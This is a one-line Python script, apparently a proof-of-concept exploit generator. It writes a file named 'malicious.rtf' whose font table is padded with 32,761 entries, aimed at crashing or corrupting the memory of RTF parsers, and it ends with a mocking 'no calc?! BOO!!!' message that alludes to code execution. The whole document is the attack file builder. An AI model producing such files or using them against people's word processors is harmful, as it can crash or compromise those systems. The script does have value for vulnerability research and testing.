open("malicious.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch it didn't crash?? no calc?! BOO!!!}\n}}\n").encode('utf-8'))
